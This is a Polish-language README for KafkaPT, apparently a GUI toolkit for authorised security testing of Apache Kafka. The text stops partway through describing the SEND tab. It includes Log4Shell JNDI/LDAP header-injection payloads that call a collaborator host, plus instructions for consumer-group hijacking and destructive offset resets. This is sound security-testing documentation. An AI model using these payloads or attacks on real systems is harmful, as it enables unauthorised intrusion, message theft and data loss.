# KafkaPT v2.0 — Kafka Pentest Toolkit

> **Desktopowy interfejs graficzny do testów bezpieczeństwa środowisk Apache Kafka.**
> Napisany w Pythonie z PyQt6. Przeznaczony dla testerów penetracyjnych, badaczy bezpieczeństwa i deweloperów przeprowadzających audyty wdrożeń Kafka.

---

## Spis treści

1. [Podstawy — Czym jest Apache Kafka?](#1-podstawy--czym-jest-apache-kafka)
2. [Czym jest testy penetracyjne?](#2-czym-są-testy-penetracyjne)
3. [Czym jest KafkaPT?](#3-czym-jest-kafkapt)
4. [Wymagania wstępne](#4-wymagania-wstępne)
5. [Instalacja](#5-instalacja)
6. [Uruchomienie narzędzia](#6-uruchomienie-narzędzia)
7. [Przegląd interfejsu](#7-przegląd-interfejsu)
8. [Zakładki konfiguracyjne — górna część](#8-zakładki-konfiguracyjne--górna-część)
   - [SCHEMA](#81-zakładka-schema)
   - [CERTIFICATES](#82-zakładka-certificates)
   - [ENCRYPTION](#83-zakładka-encryption)
   - [PROXY / BURP](#84-zakładka-proxy--burp)
9. [Zakładki operacyjne — dolna część](#9-zakładki-operacyjne--dolna-część)
   - [RECON](#91-zakładka-recon)
   - [ATTACK](#92-zakładka-attack)
   - [READ](#93-zakładka-read)
   - [SEND](#94-zakładka-send)
   - [RANDOMIZE](#95-zakładka-randomize)
   - [FINDINGS](#96-zakładka-findings)
10. [Typowy przebieg testu penetracyjnego](#10-typowy-przebieg-testu-penetracyjnego)
11. [Opis presetów injekcji](#11-opis-presetów-injekcji)
12. [Rozumienie findingów](#12-rozumienie-findingów)
13. [Eksport wyników](#13-eksport-wyników)
14. [Rozwiązywanie problemów](#14-rozwiązywanie-problemów)
15. [Zastrzeżenie prawne](#15-zastrzeżenie-prawne)

---

## 1. Podstawy — Czym jest Apache Kafka?

Apache Kafka to **broker wiadomości** — system, który pozwala aplikacjom wysyłać i odbierać dane między sobą. Wyobraź sobie lotnisko:

- **Topiki (topics)** to bramki odlotów — dane przepływają przez nie.
- **Producenci (producers)** to aplikacje, które *wysyłają* wiadomości do topiku (jak samolot wylatujący).
- **Konsumenci (consumers)** to aplikacje, które *odczytują* wiadomości z topiku (jak samolot lądujący).
- **Brokery (brokers)** to serwery Kafka, które przechowują i przekazują wiadomości (lotnisko samo w sobie).
- **Grupy konsumentów (consumer groups)** to zespoły konsumentów wspólnie odczytujące ten sam topik.

Kafka jest powszechnie stosowana w bankach, platformach e-commerce, systemach opieki zdrowotnej i wszędzie tam, gdzie trzeba niezawodnie przesyłać duże ilości danych. To czyni ją też cennym celem dla testów bezpieczeństwa.

**Co czyni Kafkę interesującą z punktu widzenia pentestera?**

- Wiadomości mogą zawierać wrażliwe dane (rekordy płatności, dane osobowe, dane uwierzytelniające).
- Jeśli listy kontroli dostępu (ACL) są błędnie skonfigurowane, atakujący może odczytywać wiadomości, do których nie powinien mieć dostępu.
- Nagłówki wiadomości Kafka mogą być wypełnione złośliwymi ładunkami ataku.
- Offsety grup konsumentów można manipulować, powodując utratę danych lub ataki powtórzeniowe.
- Endpointy Schema Registry można enumerować w celu odkrycia struktury danych.

---

## 2. Czym są testy penetracyjne?

Testy penetracyjne (pentesty) to **autoryzowane, kontrolowane hakowanie**. Specjalista ds. bezpieczeństwa otrzymuje od właściciela systemu pozwolenie na jego atak, aby znaleźć podatności zanim zrobi to prawdziwy napastnik.

Pentest jest zawsze przeprowadzany z:
- Pisemną autoryzacją (dokument zakresu lub umowa).
- Zdefiniowanymi granicami (które systemy można testować, których nie).
- Celem znalezienia i udokumentowania słabości, a następnie pomocy w ich naprawie.

**Nigdy nie używaj tego narzędzia wobec systemów, na których testowanie nie masz pisemnego pozwolenia.**

---

## 3. Czym jest KafkaPT?

KafkaPT v2.0 to **desktopowe narzędzie z interfejsem graficznym** (program z oknami i przyciskami), które pomaga przeprowadzać testy bezpieczeństwa środowisk Apache Kafka. Opakowuje typowe zadania pentesterskie Kafka w wizualny interfejs — nie trzeba pamiętać argumentów wiersza poleceń.

**Co KafkaPT potrafi:**

| Możliwość | Opis |
|---|---|
| Połączenie z mTLS | Połączenie z brokerami i Schema Registry przy użyciu certyfikatów klienta |
| Rozpoznanie | Enumeracja topików, brokerów, grup konsumentów i reguł ACL |
| Odczyt wiadomości | Konsumowanie i inspekcja wiadomości z dowolnego topiku |
| Wysyłanie wiadomości | Produkowanie wiadomości z niestandardowymi ładunkami i nagłówkami |
| Injekcja nagłówków | Testowanie, czy nagłówki wiadomości Kafka docierają do systemów downstream bez sanityzacji |
| Testowanie bypassu ACL | Test, czy certyfikat może uzyskać dostęp do zabronionych topików |
| Manipulacja offsetami | Reset offsetów grupy konsumentów (odtworzenie / pominięcie wiadomości) |
| Enumeracja schematów | Brute-force ID Schema Registry w celu odkrycia schematów danych |
| Integracja z Burp Suite | Routing ruchu HTTP przez Burp do przechwycenia i inspekcji |
| Obsługa Avro | Serializacja i deserializacja wiadomości kodowanych w Avro |
| Szyfrowanie ładunków | Szyfrowanie wiadomości algorytmem AES lub ChaCha20 przed wysłaniem |
| Śledzenie findingów | Automatyczne rejestrowanie wykrytych podatności |
| Eksport raportów | Eksport findingów jako Markdown i wiadomości jako NDJSON |

---

## 4. Wymagania wstępne

### Co potrzebujesz przed instalacją

**1. Python 3.11 lub nowszy**

Sprawdź, czy Python jest zainstalowany:
```bash
python3 --version
```
Jeśli nie — pobierz z [python.org](https://www.python.org/downloads/).

**2. pip (menedżer pakietów Python)**

Zazwyczaj instalowany razem z Pythonem. Sprawdź:
```bash
pip --version
```

**3. Środowisko Kafka do testowania**

Potrzebujesz adresu brokera (np. `kafka.internal:9093`) i pozwolenia właściciela na jego testowanie. Jeśli chcesz najpierw testować lokalnie, możesz uruchomić brokera Kafka z Dockerem:

```bash
docker run -d --name kafka \
  -p 9092:9092 \
  -e KAFKA_CFG_NODE_ID=1 \
  -e KAFKA_CFG_PROCESS_ROLES=broker,controller \
  -e KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \
  -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \
  -e KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=1@localhost:9093 \
  -e KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER \
  bitnami/kafka:latest
```

**4. (Opcjonalnie) Burp Suite**

Do przechwytywania HTTP (ruch do Schema Registry). Działa bezpłatna wersja Community Edition. Pobierz z [portswigger.net](https://portswigger.net/burp).

**5. (Opcjonalnie) Certyfikaty mTLS**

Jeśli broker Kafka wymaga wzajemnego TLS (certyfikatów klienta), potrzebujesz:
- `ca-cert.pem` — certyfikat Urzędu Certyfikacji (CA)
- `client-cert.pem` — Twój certyfikat klienta
- `client-key.pem` — Twój prywatny klucz klienta

Poproś właściciela systemu o certyfikaty testowe.

---

## 5. Instalacja

### Krok 1 — Sklonuj lub pobierz repozytorium

```bash
git clone https://github.com/TWOJA_NAZWA/kafkapt.git
cd kafkapt
```
Lub pobierz ZIP z GitHuba i rozpakuj.

### Krok 2 — (Zalecane) Utwórz wirtualne środowisko

Izoluje zależności KafkaPT od systemowego Pythona:

```bash
python3 -m venv venv

# Na Linux / macOS:
source venv/bin/activate

# Na Windows:
venv\Scripts\activate
```

W terminalu zobaczysz `(venv)` gdy środowisko jest aktywne.

### Krok 3 — Zainstaluj zależności

```bash
pip install PyQt6 confluent-kafka fastavro requests cryptography
```

Co robi każdy pakiet:

| Pakiet | Przeznaczenie |
|---|---|
| `PyQt6` | Framework interfejsu graficznego |
| `confluent-kafka` | Połączenie z brokerami Kafka (producent i konsument) |
| `fastavro` | Serializacja i deserializacja wiadomości kodowanych w Avro |
| `requests` | Klient HTTP do komunikacji z Schema Registry |
| `cryptography` | Szyfrowanie ładunków AES i ChaCha20 |

> **Na Linuxie**, jeśli pojawi się błąd PyQt6 dotyczący brakujących bibliotek systemowych, uruchom:
> ```bash
> sudo apt-get install libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1
> ```

### Krok 4 — Weryfikacja instalacji

```bash
python3 -c "import PyQt6, confluent_kafka, fastavro, requests, cryptography; print('Wszystkie zależności OK')"
```

Powinieneś zobaczyć: `Wszystkie zależności OK`

---

## 6. Uruchomienie narzędzia

```bash
python3 kafka-pt-v2.py
```

Otworzy się okno KafkaPT. Pasek tytułu pokazuje **KafkaPT v2.0 // Kafka Pentest Toolkit**.

> **Motyw:** Kliknij przycisk **☀ LIGHT** w prawym górnym rogu, aby przełączać między trybem ciemnym i jasnym.

---

## 7. Przegląd interfejsu

Okno KafkaPT jest podzielone na dwie główne sekcje:

```
┌──────────────────────────────────────────────────────────────┐
│  KAFKAPT                                          ☀ LIGHT    │
│  Kafka Pentest Toolkit / v2.0 / Sprint 1+2                   │
├──────────────────────────────────────────────────────────────┤
│                  ZAKŁADKI KONFIGURACYJNE                     │
│  [ SCHEMA ] [ CERTIFICATES ] [ ENCRYPTION ] [ PROXY/BURP ]  │
│                                                              │
│  (skonfiguruj ustawienia połączenia tutaj przed testowaniem) │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│                   ZAKŁADKI OPERACYJNE                        │
│ [ RECON ] [ ATTACK ] [ READ ] [ SEND ] [ RANDOMIZE ] [FIND] │
│                                                              │
│  (tutaj uruchamiasz właściwe testy)                          │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

**Górna sekcja** — Zakładki konfiguracyjne: ustaw parametry połączenia jednorazowo przed testowaniem.

**Dolna sekcja** — Zakładki operacyjne: uruchamiaj poszczególne działania testowe.

**Pasek stanu** — Na samym dole, pokazuje aktualny stan narzędzia.

---

## 8. Zakładki konfiguracyjne — górna część

Te zakładki muszą być skonfigurowane **zanim** uruchomisz jakiekolwiek operacje. Traktuj to jak wypełnianie ustawień połączenia.

---

### 8.1 Zakładka SCHEMA

**Co to jest:** Apache Kafka często korzysta z **Schema Registry** — usługi przechowującej format danych (schemat) wiadomości. KafkaPT może połączyć się z tym rejestrem, aby pobrać schematy i poprawnie zdekodować wiadomości.

**Dlaczego to ważne dla pentestera:** Schema Registry to serwis HTTP. Ruch do niego można przechwycić przez Burp Suite. Rejestr może ujawniać schematy odkrywające wewnętrzne struktury danych. Identyfikatory (ID) można enumerować (zgadywać po kolei) w celu znalezienia schematów, do których nie powinniśmy mieć dostępu.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **Registry URL** | Adres Schema Registry, np. `http://schema-registry:8081` lub `https://registry.internal:8443` |
| **Schema ID** (licznik) | Numeryczny ID schematu do pobrania. Zacznij od `1`. |
| **FETCH SCHEMA** | Łączy się z rejestrem i pobiera schemat o podanym ID. Schemat pojawia się w obszarze poniżej. |
| **Etykieta statusu** | Pokazuje czy pobieranie się powiodło, nie powiodło lub jest w toku. |
| **Enum IDs / from / to** | Ustala zakres ID schematów do skanowania. Np. od `1` do `200` oznacza próbę każdego ID od 1 do 200. |
| **ENUMERATE** | Uruchamia skan brute-force. KafkaPT próbuje każde ID w zakresie i raportuje które istnieją. |
| **STOP** | Zatrzymuje trwającą enumerację. |
| **Pasek postępu** | Pokazuje postęp enumeracji. |

#### Jak używać SCHEMA:

1. Wpisz URL Schema Registry (zapytaj właściciela systemu lub znajdź w konfiguracji aplikacji).
2. Wpisz Schema ID `1` i kliknij **FETCH SCHEMA**.
3. Jeśli schemat się wczyta — zostanie automatycznie użyty do dekodowania Avro w zakładkach READ i SEND.
4. Aby enumerować: ustaw „from" na `1`, „to" na `500`, kliknij **ENUMERATE**. Istniejące ID pojawią się na zielono.

> **Uwaga pentesterska:** Jeśli możesz enumerować schematy, do których nie masz jawnie przyznanego dostępu, to finding **INFO/MEDIUM** zależnie od wrażliwości ujawnionych struktur danych.

---

### 8.2 Zakładka CERTIFICATES

**Co to jest:** Brokery Kafka często wymagają **wzajemnego TLS (mTLS)** — zarówno serwer, jak i klient muszą przedstawić certyfikaty, aby potwierdzić swoją tożsamość. W tej zakładce konfigurujesz te certyfikaty.

**Bez tej konfiguracji:** Możesz łączyć się tylko z brokerami Kafka korzystającymi ze zwykłych (nieszyfrowanych, bez autoryzacji) połączeń, co jest rzadkie w środowiskach produkcyjnych.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **mTLS — Schema Registry** (checkbox) | Włącza autoryzację certyfikatami dla żądań HTTP do Schema Registry. |
| **mTLS — Kafka Broker** (checkbox) | Włącza autoryzację certyfikatami dla wszystkich połączeń z brokerem (READ, SEND, RECON, ATTACK). |
| **CA Cert** | Ścieżka do pliku Urzędu Certyfikacji (`.pem`). Używany do weryfikacji tożsamości serwera. Kliknij **BROWSE** aby wybrać plik. |
| **Client Cert** | Ścieżka do Twojego pliku certyfikatu klienta (`.pem`). Potwierdza Twoją tożsamość wobec serwera. |
| **Client Key** | Ścieżka do Twojego pliku klucza prywatnego (`.pem`) odpowiadającego certyfikatowi klienta. |
| **Key Passphrase** | Jeśli klucz prywatny jest chroniony hasłem, wpisz je tutaj. Zostaw puste jeśli nie jest wymagane. |
| **Verify server certificate** (checkbox) | Gdy zaznaczone (domyślnie), KafkaPT weryfikuje certyfikat serwera wobec CA. **Odznacz** jeśli broker używa certyfikatu samopodpisanego. |

#### Jak używać CERTIFICATES:

1. Zaznacz **mTLS — Kafka Broker** (i/lub Schema Registry jeśli potrzeba).
2. Kliknij **BROWSE** obok **CA Cert** i wybierz plik `ca-cert.pem`.
3. Kliknij **BROWSE** obok **Client Cert** i wybierz `client-cert.pem`.
4. Kliknij **BROWSE** obok **Client Key** i wybierz `client-key.pem`.
5. Jeśli klucz ma hasło, wpisz je w **Key Passphrase**.
6. Zostaw **Verify server certificate** zaznaczone chyba że używasz certyfikatów samopodpisanych.

> **Uwaga pentesterska:** Jeśli możesz połączyć się z brokerem **bez** certyfikatów (zwykłe połączenie na porcie 9092), to finding **HIGH** — broker nie wymusza autoryzacji.

---

### 8.3 Zakładka ENCRYPTION

**Co to jest:** Niektóre wdrożenia Kafka szyfrują ładunki wiadomości na poziomie aplikacji (oprócz szyfrowania transportu TLS). Ta zakładka pozwala szyfrować wiadomości przed wysłaniem, aby testować jak systemy obsługują szyfrowane ładunki.

**Większość użytkowników pozostawi tę zakładkę bez zmian** (ustawioną na "None") chyba że docelowy system oczekuje zaszyfrowanych ładunków.

#### Pola:

| Pole | Co robi |
|---|---|
| **Cipher Mode** | Wybierz algorytm szyfrowania: `None`, `AES-128-CBC`, `AES-256-CBC`, `AES-128-GCM`, `AES-256-GCM` lub `ChaCha20-Poly1305`. Domyślnie `None (Avro only)`. |
| **Shared Secret** | Klucz szyfrowania. Pokazywany jako kropki (pole hasła). Kliknij **SHOW** aby ujawnić. |
| **Key Encoding** | Jak kodowany jest klucz: `hex`, `base64` lub `utf-8 raw`. |
| **IV / Nonce** | Obsługa wektora inicjalizacji: losowy na wiadomość (zalecany), stały lub dołączony do szyfrogramu. |
| **Fixed IV** | Gdy wybrano „Fixed IV", wpisz IV tutaj w hex. |

> Zostaw jako `None (Avro only)` jeśli nie wiesz konkretnie, że cel używa szyfrowania na poziomie aplikacji.

---

### 8.4 Zakładka PROXY / BURP

**Co to jest:** Ta zakładka konfiguruje KafkaPT do kierowania **ruchu HTTP** (żądania do Schema Registry) przez Burp Suite, dzięki czemu możesz przechwytywać, modyfikować i powtarzać te żądania. Przechowuje też **URL Collaboratora** używany w ładunkach injekcji do wykrywania wywołań zwrotnych poza-pasmowych.

**Dlaczego to ważne:** Binarnego protokołu Kafka nie można przechwycić przez Burp bezpośrednio. Ale Schema Registry używa HTTP — więc Burp *może* przechwycić te żądania. Ponadto, ładunki Log4Shell i SSRF potrzebują serwera do „oddzwonienia" — tym serwerem jest właśnie Collaborator.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **Enable HTTP proxy** (checkbox) | Włącza/wyłącza routing przez proxy. Gdy WŁĄCZONY, wszystkie żądania HTTP do Schema Registry idą przez Burp. |
| **Proxy URL** | Adres nasłuchu Burpa. Domyślnie `http://127.0.0.1:8080`. Zmień jeśli Burp jest skonfigurowany inaczej. |
| **TEST** (przycisk) | Wysyła testowe żądanie przez proxy, aby sprawdzić czy Burp działa. |
| **Schema Registry** (checkbox) | Kieruj ruch do Schema Registry przez proxy. (Zawsze zaznaczony gdy proxy jest włączony.) |
| **Collaborator URL** | Twój adres Burp Collaboratora (lub Interactsh). Przykład: `abc123.oastify.com`. **Nie wpisuj `http://`**. |
| **Etykieta statusu** | Pokazuje czy proxy jest aktywne i osiągalne. |

#### Jak skonfigurować integrację z Burp:

1. Otwórz Burp Suite. Upewnij się że listener Proxy działa na `127.0.0.1:8080`.
2. W KafkaPT przejdź do zakładki **PROXY / BURP**.
3. Zaznacz **Enable HTTP proxy**.
4. Kliknij **TEST** — powinieneś zobaczyć „proxy reachable (HTTP 200)".
5. W **Collaborator URL** wpisz swój adres Burp Collaboratora (wygeneruj go w Burp → zakładka Collaborator → „Copy to clipboard").
6. Teraz gdy używasz **FETCH SCHEMA** lub **ENUMERATE** w zakładce SCHEMA, te żądania pojawią się w historii HTTP Burpa.

> **Wskazówka dotycząca Collaboratora:** Placeholder `COLLAB` w presetach injekcji jest automatycznie zastępowany Twoim URL-em gdy stosujesz preset. Więc `${jndi:ldap://COLLAB/a}` staje się `${jndi:ldap://abc123.oastify.com/a}`.

---

## 9. Zakładki operacyjne — dolna część

To są zakładki, w których faktycznie przeprowadzasz testy. Są ułożone w kolejności workflow pentesterskiego: najpierw RECON (zbieranie informacji), potem ATTACK (testowanie podatności), następnie READ i SEND (interakcja z danymi).

---

### 9.1 Zakładka RECON

**Co to jest:** Rozpoznanie oznacza zbieranie informacji o celu przed atakiem. Zakładka RECON łączy się z brokerem Kafka i zbiera:
- Jakie brokery istnieją i na jakich adresach.
- Jakie topiki są widoczne.
- Jakie grupy konsumentów są aktywne.
- Jakie reguły ACL są skonfigurowane.

**Dlaczego to ważne:** Musisz wiedzieć jakie topiki istnieją zanim zaczniesz je testować. Grupy konsumentów i reguły ACL ujawniają architekturę bezpieczeństwa. Wildcard ACL (`User:*`) to natychmiastowy finding krytyczny.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **Broker** | Adres brokera: `hostname:port`, np. `kafka.internal:9093`. |
| **RUN ALL** | Uruchamia wszystkie trzy fazy (topologia + grupy + ACLe) jednym kliknięciem. Zacznij tutaj. |
| **FETCH TOPOLOGY** | Pobiera tylko informacje o brokerach i topikach. Używa `Consumer.list_topics()` — działa nawet bez uprawnień admina. |
| **LIST GROUPS** | Listuje grupy konsumentów. Używa `AdminClient.list_consumer_groups()` — może wymagać dostępu admina. |
| **DESCRIBE ACLs** | Pobiera reguły ACL. Wymaga uprawnień `DescribeConfigs`. Jeśli dostęp jest odmówiony, sam ten fakt jest pokazany (nie jest to błąd). |
| **STOP** | Zatrzymuje trwającą operację recon. |

#### Pod-zakładki wewnątrz RECON:

**Pod-zakładka TOPOLOGY:**
- Lewy panel: lista **brokerów** — pokazuje ID brokera, hostname i port.
- Prawy panel: lista **topików** — pokazuje nazwę topiku i liczbę partycji.

**Pod-zakładka GROUPS:**
- Listuje wszystkie ID grup konsumentów widocznych dla Twojego certyfikatu.

**Pod-zakładka ACLS:**
- Wyświetla każdą regułę ACL w formacie: `ResourceType:ResourceName:Principal:Operation:Permission`.
- Linie gdzie **User:\* ma Allow** są podświetlone na czerwono — oznacza to że wszyscy mają dostęp.
- Na dole pojawia się ostrzeżenie jeśli znajdą się wildcard ACLe.

#### Jak uruchomić RECON:

1. Wpisz adres **Broker** (np. `kafka.internal:9093`).
2. Upewnij się że certyfikaty są skonfigurowane w zakładce **CERTIFICATES**.
3. Kliknij **RUN ALL**.
4. Poczekaj kilka sekund. Wyniki pojawiają się w pod-zakładkach.
5. Sprawdź pod-zakładkę **ACLS** dla czerwonych wpisów.
6. Sprawdź zakładkę **FINDINGS** — recon automatycznie dodaje findingi dla odkrytych topików, grup i wildcard ACLi.

> **Częsty wynik:** „ACL enumeration denied — not authorized" to **normalne** dla certyfikatów bez uprawnień admina i nie jest błędem. Oznacza że broker poprawnie ogranicza widoczność ACLi.

---

### 9.2 Zakładka ATTACK

**Co to jest:** Zakładka ATTACK grupuje trzy kategorie aktywnych ataków. Każda pod-zakładka to inny rodzaj testu. Wszystkie ataki wymagają jawnej autoryzacji od właściciela systemu.

> ⚠️ **Ostrzeżenie:** Działania w tej zakładce mogą powodować zakłócenia w działaniu serwisu. Pod-zakładka OFFSET ATTACK może powodować trwałą utratę danych. Zawsze uzyskaj pisemną autoryzację przed używaniem tych funkcji.

---

#### ATTACK → pod-zakładka HEADER INJECT

**Co to jest:** Wiadomości Kafka mogą zawierać **nagłówki** — metadane klucz-wartość dołączone do każdej wiadomości, oddzielnie od treści. Nagłówki te są często przekazywane do systemów downstream (np. aplikacji webowej przetwarzającej wiadomość). Jeśli te systemy nie sanityzują wartości nagłówków, możliwe są ataki injekcji.

**Co testujesz:** Czy złośliwa wartość w nagłówku wiadomości Kafka dociera i jest wykonywana przez system backend. Typowe ładunki: Log4Shell (`${jndi:ldap://...}`), SSRF, injekcja szablonów.

| Pole / Przycisk | Co robi |
|---|---|
| **Broker** | Adres brokera dla tego konkretnego testu. |
| **Topic** | Topik do wysłania wstrzykniętej wiadomości. |
| **Message body** | Treść JSON wiadomości. Domyślnie `{"legit":"payload"}`. Zostaw bez zmian chyba że konsument waliduje strukturę treści. |
| **Lista rozwijana Preset** | Wybierz typ injekcji (Log4Shell, SSRF, SQLi, XSS itp.). Po wybraniu presetu, ładunek jest stosowany do wszystkich komórek wartości nagłówków. |
| **Przycisk +** | Dodaj nowy wiersz nagłówka. |
| **Przycisk −** | Usuń zaznaczony wiersz nagłówka. |
| **Kolumna Header Name** | Nazwa nagłówka Kafka (np. `X-Correlation-ID`, `User-Agent`). |
| **Kolumna Header Value** | Ładunek injekcji (np. `${jndi:ldap://abc123.oastify.com/a}`). |
| **INJECT** | Wysyła wiadomość ze wszystkimi nagłówkami do brokera. |

**Jak używać HEADER INJECT:**

1. Wpisz Broker i Topic.
2. W zakładce **PROXY / BURP** upewnij się że URL Collaboratora jest ustawiony.
3. Wróć do ATTACK → HEADER INJECT, kliknij **+** aby dodać wiersz. Domyślna nazwa to `X-Correlation-ID`.
4. Z listy **Preset** wybierz `Log4Shell — JNDI/LDAP`. Kolumna wartości wypełni się automatycznie `${jndi:ldap://TWÓJ_COLLAB_URL/a}`.
5. Dodaj więcej nagłówków jeśli potrzeba (kliknij **+** ponownie, zmień nazwę).
6. Kliknij **INJECT**.
7. Monitoruj Burp Collaboratora przez callbacks DNS/HTTP. Callback oznacza że system downstream przetworzył nagłówek i serwer próbował połączyć się z Collaboratorem — finding **CRITICAL**.

---

#### ATTACK → pod-zakładka ACL BYPASS

**Co to jest:** ACLe (Access Control Lists) w Kafka definiują którzy klienci mogą czytać z lub pisać do których topików. Jeśli ACLe są błędnie skonfigurowane, Twój certyfikat może mieć dostęp do topików, do których nie powinien.

| Pole / Przycisk | Co robi |
|---|---|
| **Broker** | Adres brokera. |
| **Target topic** | Topik, do którego NIE powinieneś mieć dostępu. Odkrywasz je przez RECON. |
| **Ghost group ID** | ID grupy konsumentów *legalnego* serwisu, który chcesz podszyć. Również z RECON. |
| **TEST READ** | Próbuje skonsumować 1 wiadomość z docelowego topiku. Jeśli wiadomość dotrze — to bypass ACL. Jeśli zablokowane — pokazany jest komunikat błędu. |
| **TEST WRITE** | Próbuje wyprodukować wiadomość-marker do docelowego topiku. Jeśli dostarczona — bypass ACL. |
| **GHOST JOIN** | Dołącza do podanej grupy konsumentów na docelowym topiku. Jeśli Kafka na to pozwoli, Twój klient dostaje przypisane partycje — kradnąc wiadomości od legalnego serwisu. Przed wykonaniem pojawia się dialog potwierdzenia. |

**Jak używać ACL BYPASS:**

1. Najpierw uruchom **RECON → TOPOLOGY** aby odkryć topiki, do których nie powinieneś mieć dostępu.
2. Uruchom **RECON → GROUPS** aby znaleźć ID legalnych grup konsumentów.
3. Wpisz zabroniany topik w **Target topic**.
4. Kliknij **TEST READ**. Obserwuj log wyjścia.
   - „blocked: TOPIC_AUTHORIZATION_FAILED" → ACL działa poprawnie.
   - Pojawia się wiadomość → finding **CRITICAL**, dodawany automatycznie do FINDINGS.
5. Kliknij **TEST WRITE**. Ta sama logika.
6. Dla **GHOST JOIN**: wpisz ID legalnej grupy w **Ghost group ID**, kliknij przycisk, przeczytaj uważnie ostrzeżenie, kliknij OK tylko jeśli jesteś autoryzowany. Jeśli wiadomości dotrą — finding CRITICAL.

---

#### ATTACK → pod-zakładka OFFSET ATTACK

**Co to jest:** Kafka śledzi „offset" — jak daleko każda grupa konsumentów przeczytała w każdym topiku. Resetując ten offset, możesz zmusić konsumentów do ponownego odczytu starych wiadomości (atak powtórzeniowy) lub przeskoczenia naprzód tak żeby pominęli bieżące wiadomości (utrata danych).

> ⚠️ **To jest operacja destrukcyjna.** Tryb „latest" powoduje utratę wiadomości. Przed wykonaniem pojawia się dialog potwierdzenia z ostrzeżeniem.

| Pole / Przycisk | Co robi |
|---|---|
| **Broker** | Adres brokera. |
| **Consumer Group** | Grupa, której offsety chcesz zresetować. |
| **Topic** | Topik, w którym resetować offsety. |
| **Reset to** | `earliest` (ponownie przeczytaj wszystkie wiadomości od początku), `latest` (przeskocz na koniec, pomijając wszystkie oczekujące wiadomości), lub `specific offset` (skocz do konkretnej pozycji). |
| **Specific offset** (licznik) | Aktywny tylko gdy wybrano „specific offset". Wpisz docelowy numer offsetu. |
| **EXECUTE OFFSET RESET** | Wykonuje reset. Pojawia się obowiązkowy dialog potwierdzenia z ostrzeżeniem o konsekwencjach. |

**Jak używać OFFSET ATTACK:**

1. Wpisz Broker, Consumer Group (z RECON) i Topic.
2. Wybierz typ resetu — użyj „earliest" do testów powtórzeniowych (bezpieczniejszy).
3. Kliknij **EXECUTE OFFSET RESET**.
4. Uważnie przeczytaj dialog ostrzeżenia. Kliknij OK tylko jeśli jesteś autoryzowany.
5. Monitoruj docelową aplikację konsumenta — powinna zacząć ponownie przetwarzać wiadomości.
6. Finding jest automatycznie dodawany do zakładki FINDINGS.

---

### 9.3 Zakładka READ

**Co to jest:** Zakładka READ to konsument Kafka — odczytuje wiadomości z topiku i wyświetla je w czytelnym formacie. Używana do inspekcji jakie dane przepływają przez topik.

**Dlaczego przydatna w pentestach:** Możesz znaleźć dane osobowe (PII), poświadczenia, klucze API lub inne wrażliwe informacje w wiadomościach. KafkaPT automatycznie skanuje wiadomości i dodaje findingi.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **Broker** | Adres brokera (górny pasek). |
| **Topic** | Topik do odczytania. |
| **Consumer Group** | ID grupy konsumentów. Domyślnie `kafkapt-consumer`. Zmień jeśli topik wymaga konkretnej grupy. |
| **Start Offset** | `latest` — odczytaj tylko nowe wiadomości. `earliest` — odczytaj wszystkie od początku (może być bardzo wiele). `specific` — odczytaj od konkretnego numeru offsetu. |
| **Specific offset** (licznik) | Pojawia się gdy wybrano „specific". Wpisz numer offsetu. |
| **Max Messages** | Maksymalna liczba wiadomości do skonsumowania. Domyślnie 1. Zwiększ dla inspekcji masowej. |
| **READ MESSAGE(S)** | Rozpoczyna konsumowanie. Wiadomości pojawiają się w lewym panelu logu gdy nadchodzą. |
| **STOP** | Zatrzymuje konsumowanie przed osiągnięciem limitu wiadomości. |
| **CLEAR** | Czyści wszystkie odebrane wiadomości z wyświetlacza. |
| **EXPORT NDJSON** | Zapisuje wszystkie odebrane wiadomości do pliku `.ndjson` (jeden obiekt JSON na linię). Każdy rekord zawiera: topik, partycję, offset, timestamp, nagłówki, zdekodowaną wartość i surowy hex. |
| **< PREV / NEXT >** | Nawigacja między odebranymi wiadomościami w widoku szczegółów. |
| **Ignore schema** (checkbox) | Pomija dekodowanie Avro. Pokazuje surowe bajty zamiast. Przydatne gdy nie masz schematu. |
| **Display as** (lista) | Jak renderować surowe bajty: `auto-detect` (próbuje JSON, potem UTF-8, potem hex dump), `hex`, `hex dump` (układ wizualny), `UTF-8 raw` lub `base64`. |
| **Show headers** (checkbox) | Pokazuje nagłówki wiadomości Kafka (jeśli są) na dole widoku szczegółów. |
| **COPY** | Kopiuje aktualnie wyświetlaną wiadomość do schowka. |
| **Licznik wiadomości** | Pokazuje „N received" gdy wiadomości nadchodzą. |

#### Widok szczegółów (prawy panel):

Pokazuje pełną zdekodowaną zawartość aktualnie wybranej wiadomości:
- Zdekodowana treść wiadomości (JSON, zdekodowane Avro lub surowe bajty zależnie od ustawień).
- Metadane wiadomości (topik, partycja, offset, timestamp).
- Nagłówki Kafka (jeśli „Show headers" jest zaznaczone).

**Jak używać READ:**

1. Wpisz Broker, Topic i Consumer Group.
2. Ustaw **Start Offset** na `earliest` dla wiadomości historycznych lub `latest` dla live traffic.
3. Ustaw **Max Messages** (np. `10` dla próbki).
4. Kliknij **READ MESSAGE(S)**.
5. Wiadomości pojawiają się w lewym panelu. Kliknij jedną, używaj **< PREV** / **NEXT >** do nawigacji.
6. Sprawdź prawy panel szczegółów pod kątem wrażliwej zawartości.
7. Kliknij **EXPORT NDJSON** aby zapisać dowody do raportu.

> **Automatyczny skan PII:** KafkaPT automatycznie sprawdza każdą wiadomość pod kątem numerów kart kredytowych, adresów email i słów kluczowych poświadczeń. Jeśli znajdzie, finding **HIGH** jest automatycznie dodawany do zakładki FINDINGS.

---

### 9.4 Zakładka SEND

**Co to jest:** Zakładka SEND to producent Kafka — wysyła wiadomości do topiku. Używana do testów injekcji, testów bypassu ACL i weryfikacji że określone ładunki docierają do systemów downstream.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
